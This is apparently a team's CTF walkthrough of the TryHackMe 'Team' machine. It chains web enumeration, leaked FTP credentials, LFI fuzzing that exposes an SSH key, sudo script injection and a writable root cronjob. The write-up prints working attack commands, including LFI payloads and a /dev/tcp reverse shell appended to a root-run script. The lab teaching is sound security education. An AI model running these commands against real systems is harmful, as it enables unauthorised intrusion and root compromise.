
![alt text](assets/badges/fuzzraiders-Member.svg)


<div align="left">

![Category: LFI + SSH Key Abuse + Script Injection PrivEsc](https://img.shields.io/badge/Category-LFI%20%2B%20SSH%20Key%20Abuse%20%2B%20Script%20Injection-red)<br> ![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-blue)<br> ![Platform: TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-darkgreen)

</div>

# 🤝 Team Contribution

This machine was tackled as a collaborative effort by the **FuzzRaiders** team. While all members played a part, **Mr. Stager’s** work was truly impressive handling the most critical steps, demonstrating deep technical skill, and driving the majority of the exploitation and analysis. His dedication and expertise made a significant impact, and the success of this challenge wouldn’t have been possible without his efforts.

# FuzzRaiders thanks **Mr. Stager** for his amazing work, which showcases both technical excellence and exceptional teamwork.




# 📌 Overview

Team is a deliberately vulnerable Linux machine on TryHackMe. Its primary lessons are Local File Inclusion (LFI) and privilege escalation through writable root-owned cronjobs — two techniques that appear constantly in both CTF environments and real-world penetration tests.

The attack chain requires:

* Web enumeration to discover hidden files and a subdomain
* FTP access to retrieve internal notes
* Exploiting LFI with Burp Suite Intruder to leak a private SSH key
* Abusing a sudo misconfiguration to move laterally from dale to gyles
* Injecting a reverse shell into a root-owned writable cronjob script to escalate to root

---

## 🛠 Tools Used

```
nmap            → port and service discovery
gobuster        → web directory and file enumeration
ftp             → anonymous/authenticated FTP access
Burp Suite      → LFI path fuzzing via Intruder
ssh             → remote access using leaked private key
pspy64s         → process monitoring to identify root cronjobs
nc (netcat)     → reverse shell listener
```

---

## 🎯 Target Information

|Field|Value|
|---|---|
|Target IP|team.thm|
|Discovered Subdomain|dev.team.thm|
|OS|Linux (Ubuntu)|
|Web Server|Apache 2.4.29|
|Goal|Read /home/dale/user.txt and /root/root.txt|

---

## 🧭 Walkthrough

### Step 1 — Service Discovery (Nmap)

**Goal:** Identify open ports and running services.

```bash
nmap -sV -sC team.thm
```

**Key findings:**

|Port|Service|Detail|
|---|---|---|
|21/tcp|FTP|vsftpd 3.0.3|
|22/tcp|SSH|OpenSSH 7.6p1 Ubuntu|
|80/tcp|HTTP|Apache httpd 2.4.29|

Three ports open. FTP was noted but anonymous login was not permitted at this stage. The web server on port 80 was the starting point.

![alt text](Images/1.nmap.png)

---

### Step 2 — Web Enumeration (Gobuster)

**Goal:** Discover hidden directories and files on the web server.

```bash
gobuster dir -u http://team.thm/ -w /usr/share/wordlists/directory-list-2.3-medium.txt
```

![alt text](Images/2.Gobuster.png)


**Results as shown in the previous photo:**

```
/assets     (Status: 301)
/images     (Status: 301)
/scripts    (Status: 301)
/robots.txt (Status: 200)
```

**The `/scripts`** directory stood out. Gobuster was run again against it with file extension filtering:

```bash
gobuster dir -u http://team.thm/scripts -w /usr/share/wordlists/directory-list-2.3-medium.txt -x txt,js
```

**Result:**

```
/script.txt (Status: 200)
```

Browsing to `http://team.thm/scripts/script.txt` revealed a bash FTP automation script. The last line of the file was critical:

```
# Note to self had to change the extension of the old "script" in this folder, as it has creds in
```

![alt text](<Images/3.Script old found.png>)

## This hinted at an older version of the file. Browsing to `http://team.thm/scripts/script.old` revealed the FTP credentials in plaintext.





### Step 3 — FTP Access → Internal Note

**Goal:** Log into FTP and retrieve any useful files.

```bash
ftp team.thm
```

Inside the FTP share a directory named `workshare` contained a file called `New_site.txt`. Its contents:

```
Dale
    I have started coding a new website in PHP for the team to use, this is
    currently under development. It can be found at ".dev" within our domain.

    Also as per the team policy please make a copy of your "id_rsa" and place
    this in the relevent config file.

Gyles
```

Two critical pieces of information were extracted:

1. A hidden subdomain — `dev.team.thm`
2. Dale's `id_rsa` private key is stored somewhere in a config file on the server

The `/etc/hosts` file was updated:

```bash
echo "<box_ip>   dev.team.thm" >> /etc/hosts
```
![alt text](<Images/5.file+id_rsa found.png>)

---

### Step 4 — LFI Discovery on dev.team.thm

**Goal:** Find and confirm a Local File Inclusion vulnerability.

Browsing to `http://dev.team.thm/` revealed a basic development page with a single link. Following it exposed the URL:

```
http://dev.team.thm/script.php?page=teamshare.php
```

![alt text](<Images/6. - .dev subdomain found.png>)

The `page=` parameter immediately suggested LFI. Testing it manually:

```
http://dev.team.thm/script.php?page=/etc/passwd
```

The full `/etc/passwd` file was returned — LFI confirmed. Users `dale` and `gyles` were both visible as real accounts on the system.

![alt text](<Images/7.Dumped passwd with local file inclustion.png>)

---

### Step 5 — LFI Exploitation with Burp Suite Intruder

**Goal:** Use Burp Suite Intruder to fuzz a large list of LFI paths and locate dale's id_rsa private key.

The request was captured in Burp Suite and sent to Intruder. The `page=` parameter value was marked as the injection point:

```
GET /script.php?page=§/etc/passwd§ HTTP/1.1
Host: dev.team.thm
```
![alt text](<Images/8.Run Burp after finding lfl and we did spary with seclist lfi wordlist.png>)


A custom wordlist of common LFI paths was loaded as the payload — covering config files, SSH keys, logs, and system files. Intruder was fired.

Filtering results by response length to find non-default responses, the hit came back on:

```
/etc/ssh/sshd_config
```

The response body contained dale's private SSH key hidden inside comments at the bottom of the SSH config file:

```
#Dale id_rsa
#-----BEGIN OPENSSH PRIVATE KEY-----
#b3BlbnNzaC1rZXktdjEA...
#-----END OPENSSH PRIVATE KEY-----
```

The `#` characters were stripped from each line using sed:

```bash
sed 's/^#//' id_rsa > id_rsa_clean && mv id_rsa_clean id_rsa
chmod 600 id_rsa
```
![alt text](<Images/9.RSA found in running burp.png>)


![alt text](<Images/10.RSA found by running paths can be found of rsa by using lfa attack.png>)
---

### Step 6 — SSH Access as dale

**Goal:** Use the recovered private key to log in as dale.

```bash
ssh -i id_rsa dale@team.thm
```

Shell obtained as dale. The user flag was immediately accessible:

```bash
cat /home/dale/user.txt
```

![alt text](<Images/11.Login as dale with rsa.png>)

---

### Step 7 — Lateral Movement: dale → gyles (Script Abuse)

**Goal:** Escalate from dale to gyles by abusing a sudo misconfiguration.

```bash
sudo -l
```

**Output:**

```
User dale may run the following commands on TEAM:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```

Dale could run `/home/gyles/admin_checks` as gyles without a password. The script content:

![alt text](<Images/12.Script found in gyles home.png>)


```bash
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null
```

The variable `$error` takes user input and executes it directly as a shell command — this is **unsafe input handling.** When the script ran as gyles via sudo and prompted for a date, `/bin/bash -i` was supplied instead:

```bash
sudo -u gyles /home/gyles/admin_checks
# Enter name: anything
# Enter 'date': /bin/bash -i
```

The shell dropped into a gyles session. The prompt was upgraded immediately:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```
gyles@TEAM:~$
```



---

### Step 8 — Process Enumeration with pspy64s

**Goal:** Identify processes running as root that gyles may be able to influence.

pspy64s was hosted on the attacking machine and transferred to the target:

```bash
# Attacking machine:
python3 -m http.server 8000

# Target as gyles:
wget http://<tun0-ip>:8000/pspy64s -O /tmp/pspy64s
chmod +x /tmp/pspy64s
/tmp/pspy64s
```

After letting it run for a few minutes, the following was observed executing every minute with **UID=0 (root):**

```
CMD: UID=0  /bin/bash /usr/local/bin/main_backup.sh
CMD: UID=0  /bin/bash /usr/local/sbin/dev_backup.sh
CMD: UID=0  /bin/bash /opt/admin_stuff/script.sh
```
**As shown in the image below:**

![alt text](<Images/13.Found scripts runnig as root.png>)

Root was automatically running these scripts via cronjob every minute. The key question was — which one could gyles write to?

```bash
ls -la /usr/local/bin/main_backup.sh
```

**Output:**

```
-rwxrwxr-x 1 root admin /usr/local/bin/main_backup.sh
```

# The admin group had write permissions. Gyles was a member of the admin group — **meaning gyles could modify a script that root executes every minute.**


---

### Step 9 — Privilege Escalation: gyles → root (Cronjob Injection)

**Goal:** Inject a reverse shell into the writable root cronjob script.

A reverse shell payload was appended to the end of `main_backup.sh`:

```bash
echo "bash -i >& /dev/tcp/<tun0-ip>/9001 0>&1" >> /usr/local/bin/main_backup.sh
```

A netcat listener was started on the attacking machine:

```bash
nc -lvnp 9001
```

Within one minute, root executed the backup script and the reverse shell fired back:

```
connect to [<tun0-ip>] from (UNKNOWN) [team.thm]
# whoami
root
```

Root shell confirmed.

![alt text](Images/14.one_step_away.png)

---

### Step 10 — Root Flag

```bash
cat /root/root.txt
```

![alt text](Images/15.Root.txt.png)


**The following shows the command history used during the attack:**

![alt text](<Images/16.Histroy command found.png>)

---

## Proof of Compromise

|Flag|Location|Status|
|---|---|---|
|User flag|`/home/dale/user.txt`|✅ Captured|
|Root flag|`/root/root.txt`|✅ Captured|

---

## What This Lab Teaches

- **Old files left on web servers are dangerous** — `script.txt.old` contained plaintext FTP credentials
- **The `page=` parameter is always worth testing for LFI** — especially on PHP applications
- **Burp Suite Intruder is powerful for LFI fuzzing** — a large path wordlist fired through Intruder surfaces sensitive files quickly
- **Config files can hide secrets** — dale's private key was sitting inside `sshd_config` commented out
- **Unsafe variable execution in bash = command injection** — `$error` ran whatever input was supplied
- **pspy64s reveals the full picture of what root is doing** — without it the writable cronjob would have been missed
- **Writable scripts executed by root = instant privilege escalation** — appending one line was enough

---

## Attack Chain Summary

```
Nmap → ports 21, 22, 80
    ↓
Gobuster → /scripts/script.txt.old → FTP credentials
    ↓
FTP → New_site.txt → dev.team.thm subdomain + id_rsa hint
    ↓
dev.team.thm → page= parameter → LFI confirmed
    ↓
Burp Suite Intruder → LFI path fuzzing → /etc/ssh/sshd_config
    ↓
id_rsa extracted from sshd_config comments
    ↓
ssh -i id_rsa dale@team.thm → user.txt
    ↓
sudo -l → dale runs admin_checks as gyles
    ↓
$error variable abuse → /bin/bash -i → gyles shell
    ↓
pspy64s → root runs main_backup.sh every minute
    ↓
gyles has write access (admin group) → reverse shell appended
    ↓
nc -lvnp 9001 → root shell
    ↓
cat /root/root.txt
```

---

## 📌 Conclusion

> **Every misconfiguration in this chain was small — together they gave full root access.**

A leftover `.old` file, an LFI parameter, a private key stored in a config comment, an unsafe bash variable, and a writable cronjob. None of these would be catastrophic alone — but chained together they took an unauthenticated visitor all the way to root. This box is a perfect example of why defense-in-depth matters and why security reviews need to cover the entire attack surface.

---

# Happy hacking 🚀

![alt text](assets/badges/fuzzraiders-disclaimer.svg)

# Authors: Stager - Mysto - QQQ 

![alt text](assets/badges/fuzzraiders-Ownership.svg)


